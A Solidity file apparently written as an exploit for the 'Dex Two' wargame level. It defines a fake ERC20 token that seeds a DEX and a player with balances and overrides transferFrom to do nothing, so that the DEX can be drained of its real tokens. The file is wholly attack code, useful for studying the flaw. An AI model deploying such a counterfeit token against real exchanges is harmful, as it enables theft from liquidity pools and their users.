// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import "@openzeppelin/token/ERC20/IERC20.sol";
import "@openzeppelin/token/ERC20/ERC20.sol";

contract DexTwoAttack is ERC20 {
    constructor(address _dexTwoAddress, address _playerAddress) ERC20("DexTwoAttack", "D2A") {
        _mint(_dexTwoAddress, 100);
        _mint(_playerAddress, 100);
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public override returns (bool) {
        // do nothing lol
    }
}
